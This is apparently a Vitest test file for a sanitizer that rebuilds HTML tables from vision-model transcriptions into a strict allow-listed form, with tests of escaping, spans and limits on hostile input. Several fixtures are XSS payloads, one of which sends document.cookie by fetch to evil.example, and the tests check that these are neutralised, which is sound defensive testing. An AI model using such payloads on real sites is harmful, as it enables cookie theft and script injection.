import { describe, expect, it } from "vitest";

import { readTableCells } from "./table-cells-guest.js";
import { VISION_TABLE_MAX_PAGE_CHARS } from "./vision-tables-guest.js";
import { MAX_COLUMNS, RENDER_MAX_CHARS, RENDER_MAX_TAGS, sanitizeVisionPageTables } from "./vision-tables-vm.js";
import {
  MARKDOWN_LATEX_VISION_PROMPT,
  MARKDOWN_TRANSCRIPTION_VISION_PROMPT,
  PAGE_MARKDOWN_LATEX_VISION_PROMPT,
  postProcessVisionText,
} from "../tools/vision-model-profiles.js";

/** In-process (dev/self-host) path: the same guest code the VM runs, then the host's validation and rendering. */
async function clean(text: string): Promise<string> {
  return (await sanitizeVisionPageTables([text], null, { vmOnly: false })).texts[0]!;
}
const tables = (text: string) => [...text.matchAll(/<table>[\s\S]*?<\/table>/g)].map((m) => m[0]);
const tagNames = (html: string) => [...html.matchAll(/<\/?([a-z][a-z0-9-]*)/gi)].map((m) => m[1]!.toLowerCase());
const ALLOWED = new Set(["table", "thead", "tbody", "tr", "th", "td"]);

/** Every rebuilt table uses only the allow-list and is accepted by the strict downstream grid parser. */
function expectStrict(text: string) {
  for (const table of tables(text)) {
    for (const name of tagNames(table)) expect(ALLOWED.has(name), `tag ${name}`).toBe(true);
    expect(readTableCells(table), table.slice(0, 200)).not.toBeNull();
    expect(table.length).toBeLessThanOrEqual(RENDER_MAX_CHARS);
    expect(table.match(/</g)!.length).toBeLessThanOrEqual(RENDER_MAX_TAGS);
  }
}

describe("vision HTML tables: rebuilt from the VM guest's typed reading", () => {
  it("keeps a multi-level header with rowspan and colspan, in canonical form", async () => {
    const model = [
      "## Quarterly results", "", "<table>", "  <thead>",
      '    <tr><th rowspan="2">Region</th><th colspan="2">Revenue</th></tr>',
      "    <tr><th>2025</th><th>2026</th></tr>", "  </thead>", "  <tbody>",
      "    <tr><td>North</td><td>412.5</td><td>498.1</td></tr>", "  </tbody>", "</table>", "", "Growth beat the plan.",
    ].join("\n");
    const out = await clean(model);
    expect(out).toBe([
      "## Quarterly results", "", "<table>", "<thead>",
      '<tr><th rowspan="2">Region</th><th colspan="2">Revenue</th></tr>', "<tr><th>2025</th><th>2026</th></tr>", "</thead>",
      "<tbody>", "<tr><td>North</td><td>412.5</td><td>498.1</td></tr>", "</tbody>", "</table>", "", "Growth beat the plan.",
    ].join("\n"));
    expectStrict(out);
    expect(await clean(out)).toBe(out); // idempotent
  });

  it("never copies an element or attribute; the text of scripts, styles and frames is kept as inert cell text", async () => {
    const out = await clean([
      '<table onload="alert(1)" style="x"><tr>',
      '<td onclick="steal()" colspan="2" class="c">Bookings<script>fetch("https://evil.example/"+document.cookie)</script></td>',
      '<td><img src=x onerror=alert(1)>Expansion</td><td><a href="javascript:alert(1)">Launch</a></td>',
      '<td><style>body{display:none}</style>Paris</td><td><iframe src="https://evil.example"></iframe>London</td></tr></table>',
    ].join(""));
    expect(out).toBe('<table>\n<tbody>\n<tr><td colspan="2">Bookingsfetch(&quot;https://evil.example/&quot;+document.cookie)</td><td>Expansion</td><td>Launch</td><td>body{display:none}Paris</td><td>London</td></tr>\n</tbody>\n</table>');
    expectStrict(out);
  });

  // Council #338 (correctness High 2 / adversarial M2, L1): no content outside the table region is ever deleted.
  it("a void element is one token: text after it and after the table survives", async () => {
    const out = await clean('<table><tr><td>Before<embed src="x">After</td></tr></table> Ending');
    expect(out).toBe("<table>\n<tbody>\n<tr><td>BeforeAfter</td></tr>\n</tbody>\n</table>\n\n Ending");
  });

  it("raw-text elements cannot swallow content past the table's own close", async () => {
    // The unclosed script's raw text runs to the region's end: kept as escaped cell text, never as markup.
    expect(await clean("<table><tr><td>a<script>alert(1)</td></tr></table> after <b>bold</b>"))
      .toBe("<table>\n<tbody>\n<tr><td>aalert(1)&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</td></tr>\n</tbody>\n</table>\n\n after <b>bold</b>");
    expect(await clean("<table><tr><td>a<textarea>b</td></tr></table>\n\nNext paragraph")).toMatch(/<\/table>\n\nNext paragraph$/);
    expect(await clean("<table><tr><td>a<xmp></td></tr></table>tail")).toMatch(/<\/table>\n\ntail$/);
  });

  it("an unclosed table ends at a blank line before non-HTML text; the rest keeps its newlines", async () => {
    const rest = "## Results\n\n- Revenue rose 12%\n- Expansion to London\n\n```\ncode\n```\n\n$$x^2$$";
    expect(await clean(`<table><tr><td>a</td></tr>\n\n${rest}`)).toBe(`<table>\n<tbody>\n<tr><td>a</td></tr>\n</tbody>\n</table>\n\n${rest}`);
    expect(await clean("Intro\n\n<table><tr><td>Revenue</td><td>12")).toBe("Intro\n\n<table>\n<tbody>\n<tr><td>Revenue</td><td>12</td></tr>\n</tbody>\n</table>");
    // A blank line between rows of markup does not end the table.
    expect(tables(await clean("<table><tr><td>a</td></tr>\n\n<tr><td>b</td></tr></table>"))[0]).toContain("<td>b</td>");
  });

  it("an unbalanced nested table cannot pull the rest of the page into a cell", async () => {
    expect(await clean("<table><tr><td>a <table> b</td></tr></table>\n\n## Next section\n\nParagraph one."))
      .toBe("<table>\n<tbody>\n<tr><td>a b</td></tr>\n</tbody>\n</table>\n\n## Next section\n\nParagraph one.");
  });

  // Correctness Medium: code and GFM content keep their shape. Council round 4 M1: their table tags are escaped too (no
  // per-page reading can prove a tag is inside code once pages are joined), and only those tags change.
  it("keeps code spans, fences and GFM rows in place and escapes only their table tags", async () => {
    for (const text of [
      "Use `<table>` for markup. Keep these words.",
      "| Tag | Description |\n| --- | --- |\n| `<table>` | Keep words |\n\nFollowing prose",
      "```html\n<table><tr><td onclick=x>a</td></tr></table>\n```\n\nAfter the fence",
      "~~~\n<table>\n~~~",
      "Inline ``code with ` and <table> inside`` stays.",
      "| a | <td>b</td> |\n| --- | --- |",
    ]) expect(await clean(text)).toBe(text.replace(/<(\/?(?:table|tr|td)[\s/>])/g, "&lt;$1"));
  });

  it("leaves output without table markup untouched", async () => {
    const markdown = "| a | b |\n| --- | --- |\n| 1 | 2 |\n\nx<sup>2</sup> and a < b > c";
    expect(await clean(markdown)).toBe(markdown);
  });

  it("stray table tags outside a table are escaped; lookalike names are not tables", async () => {
    expect(await clean("Done</table> then <tr><td>x</td></tr>")).toBe("Done&lt;/table> then &lt;tr>&lt;td>x&lt;/td>&lt;/tr>");
    expect(await clean("<tablet>not a table</tablet>")).toBe("<tablet>not a table</tablet>");
  });

  // Correctness Medium: offsets survive expanding case mappings (U+0130 lowercases to two code points).
  it("finds tables after and inside text whose case mapping expands", async () => {
    const out = await clean("İ<table><tr><td>Apple İstanbul</td></tr></table> after");
    expect(out).toBe("İ\n\n<table>\n<tbody>\n<tr><td>Apple İstanbul</td></tr>\n</tbody>\n</table>\n\n after");
    expect(await clean("ﬀ İ <TABLE><TR><TD>x</TD></TR></TABLE>")).toContain("<td>x</td>");
  });

  // Correctness Medium: standards-compliant entities, decoded once and escaped once; inline tags join words.
  it("decodes named entities per HTML, keeps case-sensitive names, and joins inline formatting", async () => {
    const out = await clean("<table><tr><td>&eacute; &alpha; &ndash; &#x1f600; &AMP; &Amp;</td><td>Con<b>tract</b> R&amp;D</td><td>&lt;script&gt;</td><td>a<br>b</td></tr></table>");
    expect(out).toContain("<td>é α – 😀 &amp; &amp;Amp;</td><td>Contract R&amp;D</td><td>&lt;script&gt;</td><td>a b</td>");
    expectStrict(out);
  });

  // Adversarial L2: controls and noncharacters never reach a cell.
  it("strips C0/C1 controls, lone surrogates and noncharacters from cell text", async () => {
    const out = await clean("<table><tr><td>a\u0001b\u0085c&#xFFFE;d\u0000e\uD800f\u{1FFFF}g</td></tr></table>");
    // parse5 drops a raw NUL in text (HTML tokenizer rule); every other control becomes a space.
    expect(out).toContain("<td>a b c de f g</td>");
    expect(/[\p{Cc}\p{Cs}\p{Noncharacter_Code_Point}]/u.test(tables(out)[0]!.replace(/\n/g, ""))).toBe(false);
  });

  // Correctness Medium: geometry is a valid rectangle with non-overlapping spans and a real column cap.
  it("overlapping spans fall back to a plain rectangular grid the strict parser accepts", async () => {
    const out = await clean('<table><tr><td>A</td><td rowspan="2">B</td></tr><tr><td colspan="2">C</td></tr></table>');
    expect(out).toBe("<table>\n<tbody>\n<tr><td>A</td><td>B</td></tr>\n<tr><td>C</td><td></td></tr>\n</tbody>\n</table>");
    expectStrict(out);
    const adversarial = await clean("<table><tr><td rowspan=3>a</td><td>b</td></tr><tr><td colspan=100>c</td></tr><tr><td>d</td></tr></table>");
    expectStrict(adversarial);
  });

  it("pads ragged rows, cuts rowspans to their section, and caps the column count", async () => {
    const ragged = await clean("<table><tr><th>a</th><th>b</th><th>c</th></tr><tr><td>1</td></tr></table>");
    expect(ragged).toContain("<tr><td>1</td><td></td><td></td></tr>");
    expectStrict(ragged);
    const tall = await clean('<table><tr><td rowspan="100">a</td><td>b</td></tr><tr><td>c</td></tr></table>');
    expect(tall).toContain('<td rowspan="2">a</td>');
    expectStrict(tall);
    // 105 cells of colspan 100: no grid fits MAX_COLUMNS, so every cell's text is kept as plain lines.
    const wide = await clean(`<table><tr>${'<td colspan="100">x</td>'.repeat(105)}</tr></table>`);
    expect(wide).not.toContain("<t");
    expect(wide.split(" \\| ")).toHaveLength(105);
    const fits = await clean(`<table><tr>${'<td colspan="40">x</td>'.repeat(3)}</tr><tr><td>y</td></tr></table>`);
    // 120 > MAX_COLUMNS with spans: they are dropped to a plain 3-wide grid instead.
    expect(tables(fits)[0]).toBe("<table>\n<tbody>\n<tr><td>x</td><td>x</td><td>x</td></tr>\n<tr><td>y</td><td></td><td></td></tr>\n</tbody>\n</table>");
    expect(MAX_COLUMNS).toBe(100);
  });

  it("bounds span values: only plain integers 1..100 survive", async () => {
    const cells = ["99999", "0", "-3", "2.5", "1e3", "0x10", "007", " 2 ", "abc", "101"].map((v) => `<td colspan="${v}">c</td>`).join("");
    const out = await clean(`<table><tr>${cells}</tr></table>`);
    expect(out.match(/span="/g)).toHaveLength(1);
    expect(out).toContain('<td colspan="2">c</td>');
    expectStrict(out);
  });

  // Adversarial L3: a table the app renderer would refuse is written as a GFM pipe table instead.
  it("tables over the app renderer's limits become GFM pipe tables", async () => {
    const out = await clean(`<table>${"<tr><td>1</td><td>a|b</td></tr>".repeat(300)}</table>`);
    expect(out).not.toContain("<table>");
    const lines = out.split("\n");
    expect(lines[0]).toBe("| 1 | a\\|b |");
    expect(lines[1]).toBe("| --- | --- |");
    expect(lines).toHaveLength(301);
  });

  it("text outside cells is kept after the table as text", async () => {
    const out = await clean("<table><caption>Bookings <b>2026</b></caption><tr><td>a</td></tr></table>");
    expect(out).toBe("<table>\n<tbody>\n<tr><td>a</td></tr>\n</tbody>\n</table>\n\nBookings 2026");
  });

  it("every page of a document is processed together, independently", async () => {
    const pages = ["<table><tr><td>tenant page 1</td></tr></table>", "plain", "<table><tr><td>page 3</td></tr>"];
    const { texts, stats } = await sanitizeVisionPageTables(pages, null, { vmOnly: false });
    expect(texts[1]).toBe("plain");
    expect(texts[0]).toContain("tenant page 1");
    expect(texts[2]).toContain("page 3");
    expect(texts[2]).not.toContain("tenant");
    expect(stats.pages).toBe(2);
  });

  it("is bounded on hostile output; oversized pages are only escaped", async () => {
    const elapsed = async (text: string) => { const start = performance.now(); await clean(text); return performance.now() - start; };
    const n = VISION_TABLE_MAX_PAGE_CHARS - 64;
    for (const text of [
      `<table>${"<a".repeat(n / 2)}`, `<table>${"<td".repeat(n / 3)}`, `<table>${"<script>".repeat(n / 8)}`,
      "<table>".repeat(n / 7), `${"<table><tr><td>x</td></tr></table>\n".repeat(n / 35)}`, `<table>${"<!--".repeat(n / 4)}`,
      `${"`".repeat(1)}${"a `` b ``` ".repeat(n / 12)}<table>`, `<table>${"\n\n<".repeat(n / 3)}`,
    ]) expect(await elapsed(text)).toBeLessThan(5_000);
    const big = `<table><tr><td>x</td></tr></table>${"y".repeat(VISION_TABLE_MAX_PAGE_CHARS)}`;
    expect((await clean(big)).startsWith("&lt;table>&lt;tr>&lt;td>x&lt;/td>")).toBe(true);
  }, 60_000);
});

describe("vision prompts and post-processing", () => {
  it("every transcription template asks for HTML spans on merged-cell tables and keeps pipe tables for simple ones", () => {
    for (const prompt of [MARKDOWN_LATEX_VISION_PROMPT, MARKDOWN_TRANSCRIPTION_VISION_PROMPT, PAGE_MARKDOWN_LATEX_VISION_PROMPT]) {
      expect(prompt).toContain("GFM pipe tables");
      expect(prompt).toContain("rowspan or colspan");
      expect(prompt).toContain("use no other tags or attributes");
    }
  });

  // Council #338 High 1: the host-side post-process never parses model HTML; tables are rebuilt per document from the VM.
  it("postProcessVisionText is pure text repair: it never parses or rewrites HTML", () => {
    const html = '<table><tr><td onclick="x()">A</td></tr></table>';
    expect(postProcessVisionText("openai/gpt-6-luna", html)).toBe(html);
  });
});
